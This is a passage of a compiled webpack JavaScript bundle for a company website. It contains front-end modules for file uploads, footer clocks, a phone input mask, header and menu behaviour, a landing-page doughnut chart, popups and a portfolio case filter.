      uploadFileInput.prop('files', file).trigger('change');
      return false;
    });
    $(document).on('change', '.js-uploadFileInput', function (event) {
      var _this = $(event.currentTarget);
      var cloneInput = _this.clone();
      var file = event.target.files[0];
      var currentFileDrop = _this.parents('.js-filesDrop');
      var uploadList = currentFileDrop.find('.js-uploadFileList');
      var _input = currentFileDrop.find('.fieldset-file__status');
      var _required = _input.prop('required');
      var uploadFile = uploadList.find('.fieldset-file__active-load');
      var uploadErrorText = currentFileDrop.find('.js-uploadErrorText');
      var uploadErrorLabel = currentFileDrop.find('span.label-error');
      var parentForm = $(_this2).parents('form');
      if (_required) {
        currentFileDrop.addClass('required');
        _input.prop('required', false).valid();
      }

      // uploadFile.remove();
      if (Object(_helpers__WEBPACK_IMPORTED_MODULE_0__["validateExtensions"])(file, extensions) && Object(_helpers__WEBPACK_IMPORTED_MODULE_0__["validateFileSize"])(file, maxFileSize)) {
        if (currentFileDrop.hasClass('one-file')) {
          appendOneFileTemplate({
            file: file,
            uploadList: uploadList
          });
        } else {
          appendFileTemplate({
            input: _this,
            file: file,
            uploadList: uploadList
          });
          currentFileDrop.find('label').append(cloneInput.val(''));
          $('.fieldset-file__status').prop('required', false);
          if ($('form')[0].checkValidity()) {
            setTimeout(function () {
              $('.js-formSubmit').prop('disabled', false);
            }, 200);
          }
        }
        currentFileDrop.removeClass('is_error');
        uploadErrorText.text('');
      } else {
        if (!Object(_helpers__WEBPACK_IMPORTED_MODULE_0__["validateFileSize"])(file, maxFileSize)) {
          appendErrorFileTemplate({
            file: file,
            uploadList: uploadList
          }, errorText.maxsize);
        } else {
          appendErrorFileTemplate({
            file: file,
            uploadList: uploadList
          }, errorText.type);
        }
        currentFileDrop.addClass('is_error');
      }
      uploadErrorLabel.remove();
    });
    $(document).on('click', '.js-fileDelete', function (event) {
      var _this = $(event.currentTarget);
      var currentFileDrop = _this.parents('.js-filesDrop');
      var _input = currentFileDrop.find('.fieldset-file__status');
      var _required = _input.prop('required');
      var element = _this.parents('.fieldset-file__active-load');
      var currentFileList = currentFileDrop.find('.fieldset-list');
      var elements = currentFileDrop.find('.fieldset-list').children(element).length - 1;
      var currentUploadFileInput = element.find('.js-uploadFileInput');
      var parentInput = currentFileDrop.find('.js-uploadFileInput');
      var uploadList = currentFileDrop.find(".js-uploadFileList");
      var parentForm = $(_this2).parents('form');
      if (currentFileDrop.hasClass('required') && !elements) {
        _input.prop('required', true).valid();
        $('.js-formSubmit').prop('disabled', true);
      }
      if (currentFileDrop.hasClass('one-file')) {
        parentInput.val('');
      } else {
        element.remove();
      }
      element.remove();
      // uploadFileInput.remove();
      $('.js-filesDrop').removeClass('is-succes');
      if (uploadList.find(".js-uploadFile").length < 3) {
        filesDrop.removeClass("is-disabled");
      }
    });

    // $(document).on('click', '.js-fileHide', (event) => {
    //     const _this = $(event.currentTarget);
    //     const element = _this.parents('.fieldset-file__active-load');
    //
    //     element.hide();
    //     uploadFileInput.val('')
    //     // uploadFileInput.remove();
    //     $('.js-filesDrop').removeClass('is-succes');
    // });

    // window.markupPath = '';
    function appendFileTemplate(_ref) {
      var input = _ref.input,
        file = _ref.file,
        uploadList = _ref.uploadList;
      var i = 0;
      var fileName = file.name.split(".")[0];
      var fileExt = file.name.split(".")[1];
      var loadTpl = "\n\t\t<div class=\"fieldset-file__active-load js-loading js-uploadFile\">\n\t\t\t<div class=\"fieldset-file__percent\"></div>\n\t\t\t<div class=\"fieldset-file__loading\"><span></span></div>\n\t\t</div>";
      var tpl = "\n\t\t<div class=\"fieldset-file__active-load js-uploadFile\">\n\t\t\t<div class=\"fieldset-file__active-reset js-fileDelete\"></div>\n\t\t\t<div class=\"fieldset-file__active-name\">".concat(fileName, "<span class=\"gray\">.").concat(fileExt, "</span></div>\n\t\t\t<div class=\"fieldset-file__error\"></div>\n\t\t</div>");
      uploadList.append(loadTpl);
      if (uploadList.find(".js-uploadFile").length === 3) {
        filesDrop.addClass("is-disabled");
      }
      var timerId = setInterval(function () {
        i++;
        $(".js-loading").find(".fieldset-file__percent").text("".concat(i, "%"));
        $(".js-loading").find(".fieldset-file__loading span").css("width", "".concat(i, "%"));
        if (i === 100) {
          clearInterval(timerId);
          $(".js-filesDrop").addClass("is-succes");
          $(tpl).append(input);
          $(".js-loading").remove();
          uploadList.append(tpl);
          uploadList.find(".fieldset-file__active-load:last").append(input);
        }
      }, 10);
    }
    function appendErrorFileTemplate(_ref2, errorText) {
      var file = _ref2.file,
        uploadList = _ref2.uploadList;
      $(".js-filesDrop").addClass("is-error");
      var fileName = file.name.split(".")[0];
      var fileExt = file.name.split(".")[1];
      var tpl = "<div class=\"fieldset-file__active-load file-error\">\n\t\t<div class=\"fieldset-file__icon\">\n\t\t\t<svg width=\"48\" height=\"48\" viewBox=\"0 0 48 48\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\"><path d=\"M24 48C37.233 48 48 37.2327 48 24C48 10.7673 37.2327 2.87339e-06 24 1.71655e-06C10.7673 5.59714e-07 -5.59715e-07 10.7673 -1.71655e-06 24C-2.87339e-06 37.2327 10.7673 48 24 48ZM21.8182 14.996C21.8182 13.7916 22.7937 12.8141 24 12.8141C25.2063 12.8141 26.1818 13.7916 26.1818 14.996L26.1818 25.905C26.1818 27.1094 25.2063 28.0869 24 28.0869C22.7937 28.0869 21.8182 27.1094 21.8182 25.905L21.8182 14.996ZM21.8182 32.3508C21.8182 31.1464 22.7937 30.1689 24 30.1689C25.2063 30.1689 26.1818 31.1464 26.1818 32.3508L26.1818 33.0053C26.1818 34.2097 25.2063 35.1871 24 35.1871C22.7937 35.1871 21.8182 34.2097 21.8182 33.0053L21.8182 32.3508Z\" fill=\"#EE502C\"/></svg>\n\t\t</div>\n\t\t<div class=\"fieldset-file__text\">\n\t\t\t<div class=\"fieldset-file__title\">".concat(fileName, "<span class=\"gray\">.").concat(fileExt, "</span></div>\n\t\t\t<div class=\"fieldset-file__caption\">").concat(errorText, "</div>\n\t\t</div>\n\t</div>");
      uploadList.append(tpl);
    }
    function appendOneFileTemplate(_ref3) {
      var file = _ref3.file,
        uploadList = _ref3.uploadList;
      $('.js-filesDrop').addClass('is-succes');
      var uploadFile = uploadList.find('.fieldset-file__active-load');
      var tpl = "\n        <div class=\"fieldset-file__active-load\">\n            <div class=\"fieldset-file__active-icon\">\n            </div>\n            <div class=\"fieldset-file__active-name\">".concat(file.name, "</div>\n            <div class=\"fieldset-file__active-reset js-fileDelete\">\n            </div>\n            <div class=\"fieldset-file__error\"></div>\n        </div>\n    ");
      uploadFile.remove();
      uploadList.append(tpl);
    }

    /***/
  }),
  /***/"./src/js/_parts/_footer-clock.js": (
  /*!****************************************!*\
    !*** ./src/js/_parts/_footer-clock.js ***!
    \****************************************/
  /*! no exports provided */
  /***/
  function (module, __webpack_exports__, __webpack_require__) {
    "use strict";

    __webpack_require__.r(__webpack_exports__);
    /* harmony import */
    var _babel_runtime_helpers_classCallCheck__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @babel/runtime/helpers/classCallCheck */"./node_modules/@babel/runtime/helpers/classCallCheck.js");
    /* harmony import */
    var _babel_runtime_helpers_classCallCheck__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_babel_runtime_helpers_classCallCheck__WEBPACK_IMPORTED_MODULE_0__);
    /* harmony import */
    var _babel_runtime_helpers_createClass__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @babel/runtime/helpers/createClass */"./node_modules/@babel/runtime/helpers/createClass.js");
    /* harmony import */
    var _babel_runtime_helpers_createClass__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(_babel_runtime_helpers_createClass__WEBPACK_IMPORTED_MODULE_1__);
    var Clock = /*#__PURE__*/function () {
      function Clock(id) {
        _babel_runtime_helpers_classCallCheck__WEBPACK_IMPORTED_MODULE_0___default()(this, Clock);
        if (!document.getElementById(id)) {
          return;
        }
        this.timezone = parseInt(document.getElementById(id).dataset.timezone);
        this.offset = parseInt(document.getElementById(id).dataset.offset);
        if (this.isDST(new Date())) {
          this.timezone += 1;
        }
        this.handSeconds = document.querySelector("#".concat(id, " .hand.seconds"));
        this.handMinutes = document.querySelector("#".concat(id, " .hand.minutes"));
        this.handHours = document.querySelector("#".concat(id, " .hand.hours"));
        this.getTime();
        this.cycle();
      }
      _babel_runtime_helpers_createClass__WEBPACK_IMPORTED_MODULE_1___default()(Clock, [{
        key: "isDST",
        value: function isDST(now) {
          var jan = new Date(now.getFullYear(), 0, 1);
          var jul = new Date(now.getFullYear(), 6, 1);
          var dst = Math.max(jan.getTimezoneOffset(), jul.getTimezoneOffset());
          return now.getTimezoneOffset() < dst;
        }
      }, {
        key: "draw",
        value: function draw(hours, minutes, seconds) {
          var drawSeconds = seconds / 60 * 360 + 90;
          var drawMinutes = minutes / 60 * 360 + 90;
          var drawHours = hours / 12 * 360 + 90 + minutes / 2;
          this.handSeconds.style.transform = "rotate(".concat(drawSeconds, "deg)");
          this.handMinutes.style.transform = "rotate(".concat(drawMinutes, "deg)");
          this.handHours.style.transform = "rotate(".concat(drawHours, "deg)");

          // fix for animation bump on when clock hands hit zero
          if (drawSeconds === 444 || drawSeconds === 90) {
            this.handSeconds.style.transition = "all 0s ease 0s";
          } else {
            this.handSeconds.style.transition = "all 0.05s cubic-bezier(0, 0, 0.52, 2.51) 0s";
          }
        }
      }, {
        key: "getTime",
        value: function getTime() {
          var now = new Date();
          var hours = now.getUTCHours() + this.timezone;
          var minutes = now.getUTCMinutes() + this.offset;
          // const seconds = now.getUTCSeconds();

          if (minutes >= 60) {
            hours++;
            minutes -= 60;
          }
          this.draw(hours, minutes);
        }
      }, {
        key: "cycle",
        value: function cycle() {
          setInterval(this.getTime.bind(this), 1000);
        }
      }]);
      return Clock;
    }();
    new Clock('city-1');
    new Clock('city-2');
    new Clock('city-3');
    new Clock('city-4');
    new Clock('city-5');
    $('.js-clockCity').each(function (index, el) {
      var id = $(el).attr('id');
      new Clock(id);
    });

    /***/
  }),
  /***/"./src/js/_parts/_footer-download.js": (
  /*!*******************************************!*\
    !*** ./src/js/_parts/_footer-download.js ***!
    \*******************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    $('.js-downloadPresentation').on('click', function () {
      $(this).siblings('.footer-presentation-widget').slideToggle(100);
      $('.footer-presentation__back').fadeToggle();
    });

    /***/
  }),
  /***/"./src/js/_parts/_helpers.js": (
  /*!***********************************!*\
    !*** ./src/js/_parts/_helpers.js ***!
    \***********************************/
  /*! exports provided: validateExtensions, validateFileSize */
  /***/
  function (module, __webpack_exports__, __webpack_require__) {
    "use strict";

    __webpack_require__.r(__webpack_exports__);
    /* harmony export (binding) */
    __webpack_require__.d(__webpack_exports__, "validateExtensions", function () {
      return validateExtensions;
    });
    /* harmony export (binding) */
    __webpack_require__.d(__webpack_exports__, "validateFileSize", function () {
      return validateFileSize;
    });
    var validateExtensions = function validateExtensions(file, extensions) {
      var name = file.name;
      var valid = false;
      for (var j = 0; j < extensions.length; j += 1) {
        var extension = extensions[j];
        if (name.substr(name.length - extension.length, extension.length).toLowerCase() === extension.toLowerCase()) {
          valid = true;
          break;
        }
      }
      return valid;
    };
    var validateFileSize = function validateFileSize(file, maxSize) {
      return file.size <= maxSize;
    };

    /***/
  }),
  /***/"./src/js/_parts/_mask.js": (
  /*!********************************!*\
    !*** ./src/js/_parts/_mask.js ***!
    \********************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    var maskPlaceholder = '+7 (999) 999-99-99';
    function maskInit() {
      $('.js-mask').each(function (index, element) {
        var _this = $(element);
        if (_this.data('mask')) {
          maskPlaceholder = _this.data('mask');
        }
        _this.inputmask({
          'mask': maskPlaceholder
        });
      });
    }
    maskInit();
    $(document).on('maskInitTrigger', function () {
      maskInit();
    });
    $('.js-mask').on('blur', function (event) {
      var _this = $(event.currentTarget);
      setTimeout(function () {
        _this.valid();
      }, 100);
    });
    $(document).on('keydown', '.js-mask', function (event) {
      if (event.which === 32) return false;
    });

    // $(document).on('input', '.js-phone', function(event) {
    // 	$(this).parents('form').validate();
    // });

    // fix mac phone focus input
    $(document).one('focus', '.js-mask', function () {
      var _this = $(this);
      setTimeout(function () {
        _this[0].setSelectionRange(4, 4);
      }, 50);
    });

    /***/
  }),
  /***/"./src/js/_parts/_menu-fixed.js": (
  /*!**************************************!*\
    !*** ./src/js/_parts/_menu-fixed.js ***!
    \**************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    if ($('.portfolio-nav').length > 0) {
      $('.header').addClass('portfolio_nav');
      $('.header').on('mouseenter', function () {
        $('.portfolio-nav').addClass('is-hover');
      });
      $('.header').on('mouseleave', function () {
        $('.portfolio-nav').removeClass('is-hover');
      });
    }
    var scroll = 0;
    var portfolioNav = $('.portfolio-nav');
    $(window).on('load resize scroll', function () {
      var body = $('body');
      var scrolled = $(window).scrollTop();
      var header = $('.header');
      var headerHeight = header.height();
      // let portfolioNav = $('.portfolio-nav')

      // if (portfolioNav.length > 0) {
      // 	headerHeight = headerHeight + portfolioNav.height();

      // 	scrolled > scroll && header.hasClass('is-shown')
      // 		? portfolioNav.removeClass('is-show')
      // 		: portfolioNav.addClass('is-show')

      // 	scroll = scrolled
      // }

      scrolled > headerHeight ? body.addClass('header-fixed') : body.removeClass('header-fixed');
      if (scrolled > headerHeight + 100) {
        header.addClass('is-shown');
        setTimeout(function () {
          header.addClass('hide-nav');
        }, 500);
      } else {
        header.removeClass('is-shown');
        setTimeout(function () {
          header.removeClass('hide-nav');
        }, 500);
      }
      if ($('.js-sticky').length > 0) {
        var sticky = $('.js-sticky');
        if (scrolled > headerHeight + 100) {
          sticky.addClass('is_show');
        } else {
          sticky.removeClass('is_show');
        }
      }
    });
    if ($('.portfolio-nav').length > 0) {
      var getTouches = function getTouches(evt) {
        return evt.touches ||
        // browser API
        evt.originalEvent.touches; // jQuery
      };
      var handleTouchStart = function handleTouchStart(evt) {
        var firstTouch = getTouches(evt)[0];
        xDown = firstTouch.clientX;
        yDown = firstTouch.clientY;
      };
      var handleTouchMove = function handleTouchMove(evt) {
        if (!xDown || !yDown) {
          return;
        }
        var xUp = evt.touches[0].clientX;
        var yUp = evt.touches[0].clientY;
        var xDiff = xDown - xUp;
        var yDiff = yDown - yUp;
        if (Math.abs(xDiff) > Math.abs(yDiff)) {
          /*most significant*/
          if (xDiff > 0) {
            /* right swipe */
          } else {
            /* left swipe */
          }
        } else {
          if (yDiff > 0) {
            portfolioNav.removeClass('is-show');
          } else {
            portfolioNav.addClass('is-show');
          }
        }
        /* reset values */
        xDown = null;
        yDown = null;
      };
      document.addEventListener('touchstart', handleTouchStart, false);
      document.addEventListener('touchmove', handleTouchMove, false);
      var xDown = null;
      var yDown = null;
      ;
      ;
    }

    /***/
  }),
  /***/"./src/js/_parts/_menu.js": (
  /*!********************************!*\
    !*** ./src/js/_parts/_menu.js ***!
    \********************************/
  /*! no exports provided */
  /***/
  function (module, __webpack_exports__, __webpack_require__) {
    "use strict";

    __webpack_require__.r(__webpack_exports__);
    /* harmony import */
    var body_scroll_lock__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! body-scroll-lock */"./node_modules/body-scroll-lock/lib/bodyScrollLock.esm.js");
    var menu = document.querySelector('.mobile-nav__menu');
    var heightW;
    var mobileNav = $('.mobile-nav');
    var positionScroll;
    $(window).on('load scroll resize', function () {
      heightW = window.innerHeight;
      if ($('.menu-on').length < 1) {
        positionScroll = $(window).scrollTop();
      }
    });
    $('.js-menu').on('click', function () {
      $('body').toggleClass('menu-on');
      if ($('body').hasClass('menu-on')) {
        $('html').addClass('html-hidden');
        mobileNav.css('height', heightW);
      } else {
        $('html').removeClass('html-hidden');
        $('body, html').animate({
          scrollTop: positionScroll
        }, 0);
      }

      // ( $('body').hasClass('menu-on') ) ? disableBodyScroll(menu) : enableBodyScroll(menu);
    });

    /***/
  }),
  /***/"./src/js/_parts/_new-mobile.js": (
  /*!**************************************!*\
    !*** ./src/js/_parts/_new-mobile.js ***!
    \**************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    var _firstTab$getBounding, _lastTab$getBoundingC;
    var tabButtons = document.querySelectorAll('.js-tab-button');
    var tabsBlock = document.querySelector('.js-tab');
    var arrowBlock = document.querySelector('.js-tabs-arrow');
    var arrowBlockTwo = document.querySelector('.js-tabs-arrow-2');
    var verticalLine = document.querySelector('.js-vertical-line');
    var tabContents = document.querySelectorAll('.js-tab-content');
    var tabContentsImg = document.querySelectorAll('.js-animate-img');
    var tabGraphButtons = document.querySelectorAll('.js-tab-graph-button');
    var tabGraphIndicator = document.querySelector('.notamedia-landing__graphics-indicator');
    var tabGraphContents = document.querySelectorAll('.js-tab-graph-content');
    var graphButtons = document.querySelectorAll('.js-graph-button');
    var graphDescriptions = document.querySelectorAll('.js-graph-description-item');
    var graphics = document.querySelectorAll('.notamedia-landing__graphics-contents-item');
    var tabContainer = document.querySelector('.notamedia-landing__graphics');
    var tabCollection = document.querySelectorAll('.notamedia-landing__graphics-buttons-item');
    var firstTab = tabCollection[0];
    var lastTab = tabCollection[tabCollection.length - 1];
    var firstTabPosition = (_firstTab$getBounding = firstTab.getBoundingClientRect()) === null || _firstTab$getBounding === void 0 ? void 0 : _firstTab$getBounding.left;
    var lastTabPosition = (_lastTab$getBoundingC = lastTab.getBoundingClientRect()) === null || _lastTab$getBoundingC === void 0 ? void 0 : _lastTab$getBoundingC.right;
    var gradientWrapper = document.querySelector('.notamedia-landing__gradient');
    var inint = JSON.parse(graphics[0].dataset.partials);
    var getPercentAndColor = function getPercentAndColor(data) {
      return {
        percentArray: data.map(function (item) {
          return item.percent;
        }),
        colorArray: data.map(function (item) {
          return item.color;
        }),
        nameArray: data.map(function (item) {
          return item.name;
        })
      };
    };
    var nameArr = inint.map(function (item) {
      return item.name;
    });
    var initPositionArrow = function initPositionArrow() {
      if (window.innerWidth > 767) {
        console.log('if');
      } else {
        var wrapperVerticalLine = document.querySelector('.notamedia-landing__developed-right-vertical-wrapper');
        var widthBlock = tabsBlock.scrollWidth;
        var posYItem = tabButtons[0].offsetLeft;
        var itemWidth = tabButtons[0].offsetWidth;
        var verticalWidth = verticalLine.offsetWidth;
        var calcLeft = posYItem + (itemWidth / 2 - 8.5) - 20;
        var calcPercentOrGradient = (calcLeft + 8.5) * 100 / verticalWidth;
        wrapperVerticalLine.style.width = "".concat(widthBlock, "px");
        verticalLine.style.background = " linear-gradient(90deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.7) ".concat(calcPercentOrGradient, "%, rgba(255,255,255,0) 100%)");
        arrowBlockTwo.style.left = "".concat(calcLeft, "px");
      }
    };
    var _getPercentAndColor = getPercentAndColor(inint),
      initDataPercentArray = _getPercentAndColor.percentArray,
      initDataColorArray = _getPercentAndColor.colorArray;
    var removeActiveClass = function removeActiveClass(array) {
      array.forEach(function (button) {
        button.classList.remove("active");
      });
    };
    var updateChart = function updateChart(dataChart) {
      if (dataChart) {
        var _getPercentAndColor2 = getPercentAndColor(dataChart),
          percentArray = _getPercentAndColor2.percentArray,
          colorArray = _getPercentAndColor2.colorArray,
          nameArray = _getPercentAndColor2.nameArray;
        config.data.datasets = [{
          label: '',
          data: percentArray,
          backgroundColor: colorArray,
          hoverOffset: 0,
          borderRadius: 12,
          cutout: 172
        }];
        myChart.update();
        nameArr = nameArray;
      } else {
        console.log('нет данных');
      }
    };
    var config = {
      type: 'doughnut',
      data: {
        labels: '',
        datasets: [{
          label: '',
          data: initDataPercentArray,
          backgroundColor: initDataColorArray,
          hoverOffset: 0,
          borderRadius: 12,
          cutout: 172
        }]
      },
      options: {
        plugins: {
          tooltip: {
            callbacks: {
              label: function label(context) {
                if (nameArr[context.dataIndex]) {
                  return context.formattedValue = " ".concat(nameArr[context.dataIndex], ": ").concat(context.formattedValue, "%");
                } else {
                  return context.formattedValue = " ".concat(context.formattedValue, "%");
                }
              }
            }
          }
        }
      }
    };
    var myChart = new Chart(document.getElementById('myChart'), config);
    tabButtons.forEach(function (item) {
      item.addEventListener('click', function () {
        var clickTabId = item.attributes[1].value;
        removeActiveClass(tabContents);
        removeActiveClass(tabButtons);
        removeActiveClass(tabContentsImg);
        var posXItem = item.offsetTop;
        var posXBlock = tabsBlock.offsetTop;
        var blockHeight = tabsBlock.offsetHeight;
        if (window.innerWidth > 1200) {
          var calcTop = posXItem - posXBlock;
          var calcPercentOrGradient = calcTop * 100 / blockHeight;
          verticalLine.style.background = " linear-gradient(0deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.7) ".concat(100 - calcPercentOrGradient, "%, rgba(255,255,255,0) 100%)");
          arrowBlock.style.top = "".concat(calcTop, "px");
        } else if (window.innerWidth > 767) {
          var _calcTop = posXItem - posXBlock;
          var _calcPercentOrGradient = _calcTop * 100 / blockHeight;
          verticalLine.style.background = " linear-gradient(0deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.5) ".concat(100 - _calcPercentOrGradient, "%, rgba(255,255,255,0) 100%)");
          arrowBlock.style.top = "".concat(_calcTop, "px");
        } else {
          var posYItem = item.offsetLeft;
          var itemWidth = item.offsetWidth;
          var verticalWidth = verticalLine.offsetWidth;
          var calcLeft = posYItem + (itemWidth / 2 - 8.5) - 20;
          var _calcPercentOrGradient2 = (calcLeft + 8.5) * 100 / verticalWidth;
          verticalLine.style.background = " linear-gradient(90deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.7) ".concat(_calcPercentOrGradient2, "%, rgba(255,255,255,0) 100%)");
          arrowBlockTwo.style.left = "".concat(calcLeft, "px");
        }
        item.classList.add("active");
        tabContents.forEach(function (el) {
          if (el.id === clickTabId) {
            el.classList.add("active");
            var imgAnimate = el.querySelector('.notamedia-landing__developed-right-content-item-img');
            setTimeout(function () {
              imgAnimate.classList.add("active");
            }, 10);
          }
        });
      });
    });
    tabGraphButtons.forEach(function (itemGraph) {
      itemGraph.addEventListener('click', function (e) {
        var clickTabId = itemGraph.attributes[1].value;
        var tabContainerWidth = tabContainer.offsetWidth;
        var itemGraphWidth = itemGraph.offsetWidth;
        var itemGraphLeft = itemGraph.offsetLeft;
        var positionCenter = tabContainerWidth / 2 - itemGraphWidth / 2;
        var scrollLeftUpd = itemGraphLeft - positionCenter;
        tabContainer.scrollTo({
          left: scrollLeftUpd,
          behavior: "smooth"
        });
        removeActiveClass(tabGraphContents);
        removeActiveClass(tabGraphButtons);
        itemGraph.classList.add("active");
        handleIndicator(e.target);
        if (window.innerWidth > 767) {
          setTimeout(function () {
            tabBlur();
          }, 500);
        }
        removeActiveClass(graphDescriptions);
        tabGraphContents.forEach(function (el) {
          if (el.id === clickTabId) {
            removeActiveClass(graphButtons);
            el.querySelector('.notamedia-landing__graphics-contents-element').classList.add("active");
            el.querySelector('.notamedia-landing__graphics-contents-button').classList.add("active");
            el.querySelector('.notamedia-landing__graphics-contents-button-minus').classList.add("active");
            el.classList.add("active");
            var dataChart = JSON.parse(el.dataset.partials);
            updateChart(dataChart);
          }
        });
      });
      itemGraph.classList.contains('active') && handleIndicator(itemGraph);
    });
    function tabBlur() {
      if (firstTabPosition !== firstTab.getBoundingClientRect().left) {
        gradientWrapper.classList.add('notamedia-landing__gradient--left-gradient');
      } else {
        gradientWrapper.classList.remove('notamedia-landing__gradient--left-gradient');
      }
      if (lastTabPosition <= lastTab.getBoundingClientRect().right) {
        gradientWrapper.classList.add('notamedia-landing__gradient--right-gradient');
      } else {
        gradientWrapper.classList.remove('notamedia-landing__gradient--right-gradient');
      }
    }
    function handleIndicator(el) {
      tabGraphIndicator.style.width = "".concat(el.offsetWidth, "px");
      tabGraphIndicator.style.left = "".concat(el.offsetLeft, "px");
    }
    graphButtons.forEach(function (item) {
      item.addEventListener('click', function () {
        if (item.closest('.js-graph-description-item').classList.contains('active')) {
          removeActiveClass(graphDescriptions);
        } else {
          removeActiveClass(graphDescriptions);
          removeActiveClass(graphButtons);
          item.closest('.js-graph-description-item').classList.add("active");
          item.parentNode.querySelector('.notamedia-landing__graphics-contents-button-minus').classList.add('active');
          item.classList.add('active');
        }
      });
    });
    function updateTabPosition() {
      firstTabPosition = firstTab.getBoundingClientRect().left;
      lastTabPosition = lastTab.getBoundingClientRect().right;
    }
    window.onresize = function () {
      if (window.innerWidth > 767) {
        updateTabPosition();
        tabBlur();
      }
    };
    window.onload = function () {
      initPositionArrow();
      if (window.innerWidth > 767) {
        tabBlur();
      }
    };

    /***/
  }),
  /***/"./src/js/_parts/_popup.js": (
  /*!*********************************!*\
    !*** ./src/js/_parts/_popup.js ***!
    \*********************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    $('.js-openModalButton').on('click', function (e) {
      $(".js-modal[data-modal-id=".concat($(this).data('modal-src'), "]")).addClass('popup--visible');
      $('html').addClass('html-hidden-popup');
    });
    $('.js-closeModalButton').on('click', function (e) {
      $(".js-modal").removeClass('popup--visible');
      $('html').removeClass('html-hidden-popup');
    });
    $(document).ready(function () {
      $('.popup .application-form-content.offset-lg-3').removeClass('offset-lg-3');
    });

    /***/
  }),
  /***/"./src/js/_parts/_portfolio-case-images.js": (
  /*!*************************************************!*\
    !*** ./src/js/_parts/_portfolio-case-images.js ***!
    \*************************************************/
  /*! no static exports found */
  /***/
  function (module, exports) {
    function _createForOfIteratorHelper(o, allowArrayLike) {
      var it = typeof Symbol !== "undefined" && o[Symbol.iterator] || o["@@iterator"];
      if (!it) {
        if (Array.isArray(o) || (it = _unsupportedIterableToArray(o)) || allowArrayLike && o && typeof o.length === "number") {
          if (it) o = it;
          var i = 0;
          var F = function F() {};
          return {
            s: F,
            n: function n() {
              if (i >= o.length) return {
                done: true
              };
              return {
                done: false,
                value: o[i++]
              };
            },
            e: function e(_e) {
              throw _e;
            },
            f: F
          };
        }
        throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }
      var normalCompletion = true,
        didErr = false,
        err;
      return {
        s: function s() {
          it = it.call(o);
        },
        n: function n() {
          var step = it.next();
          normalCompletion = step.done;
          return step;
        },
        e: function e(_e2) {
          didErr = true;
          err = _e2;
        },
        f: function f() {
          try {
            if (!normalCompletion && it.return != null) it.return();
          } finally {
            if (didErr) throw err;
          }
        }
      };
    }
    function _unsupportedIterableToArray(o, minLen) {
      if (!o) return;
      if (typeof o === "string") return _arrayLikeToArray(o, minLen);
      var n = Object.prototype.toString.call(o).slice(8, -1);
      if (n === "Object" && o.constructor) n = o.constructor.name;
      if (n === "Map" || n === "Set") return Array.from(o);
      if (n === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)) return _arrayLikeToArray(o, minLen);
    }
    function _arrayLikeToArray(arr, len) {
      if (len == null || len > arr.length) len = arr.length;
      for (var i = 0, arr2 = new Array(len); i < len; i++) arr2[i] = arr[i];
      return arr2;
    }
    var _iterator = _createForOfIteratorHelper(document.querySelectorAll('.b-portfolio-section')),
      _step;
    try {
      for (_iterator.s(); !(_step = _iterator.n()).done;) {
        var _i$style;
        var i = _step.value;
        if ((_i$style = i.style) !== null && _i$style !== void 0 && _i$style.backgroundImage) {
          i.classList.add('b-portfolio-section_mobile-adaptive');
        }
      }
    } catch (err) {
      _iterator.e(err);
    } finally {
      _iterator.f();
    }

    /***/
  }),
  /***/"./src/js/_parts/_portfolio-filter.js": (
  /*!********************************************!*\
    !*** ./src/js/_parts/_portfolio-filter.js ***!
    \********************************************/
  /*! no exports provided */
  /***/
  function (module, __webpack_exports__, __webpack_require__) {
    "use strict";

    __webpack_require__.r(__webpack_exports__);
    /* harmony import */
    var _babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @babel/runtime/helpers/toConsumableArray */"./node_modules/@babel/runtime/helpers/toConsumableArray.js");
    /* harmony import */
    var _babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_babel_runtime_helpers_toConsumableArray__WEBPACK_IMPORTED_MODULE_0__);
    /* harmony import */
    var _babel_runtime_helpers_defineProperty__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @babel/runtime/helpers/defineProperty */"./node_modules/@babel/runtime/helpers/defineProperty.js");
    /* harmony import */
    var _babel_runtime_helpers_defineProperty__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(_babel_runtime_helpers_defineProperty__WEBPACK_IMPORTED_MODULE_1__);
    $(document).ready(function () {
      var agency = [];
      var integrator = [];
      var industry1 = [];
      var industry2 = [];
      var body = $('body');
      var active = $('.js-filterCase li.active');
      var cases = $('.cases .grid');
      var caseItem = $('.cases .grid .case');
      var url = window.location.pathname;
      var request = window.location.search;
      var searchParams = new URLSearchParams(window.location.search);
      var currentPosition = $(window).scrollTop();
      var parentTab;
      if ($('.tabs .js-filterCase').length > 0) {
        parentTab = $('.tabs');
      }
      setTimeout(function () {
        $('body').addClass('load_page');
      }, 1000);
      var $grid = $('.grid').isotope(_babel_runtime_helpers_defineProperty__WEBPACK_IMPORTED_MODULE_1___default()({
        itemSelector: '.case',
        layoutMode: 'packery'
      }, "itemSelector", '.case'));
      if (request.indexOf('integrator') > -1) {
        $('.filter_integrator').click();
      }
      window.initCases = function () {
        var filterRequest = window.location.search;
        var filtersearchParams = new URLSearchParams(window.location.search);
        if (filterRequest && (filtersearchParams.has('agency') || filtersearchParams.has('integrator') || filtersearchParams.has('industry1') || filtersearchParams.has('industry2'))) {
          var isCorrectTags = function isCorrectTags(arr, val) {
            return arr.some(function (arrVal) {
              return val === arrVal;
            });
          };
